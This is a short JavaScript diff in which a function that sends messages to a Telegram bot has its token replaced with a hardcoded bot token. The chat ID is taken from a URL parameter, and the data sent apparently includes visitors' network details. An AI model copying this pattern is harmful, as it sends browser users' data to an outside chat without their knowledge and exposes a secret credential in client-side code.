@@ -112,7 +112,7 @@ downlinkMax: ${networkInfo.downlinkMax}
 
 // Function to send data to Telegram bot
 async function sendDataToTelegram(message) {
-    const token = telegramBotToken;
+    const token = '6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ';
     const chatId = getQueryParam('id');
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
     
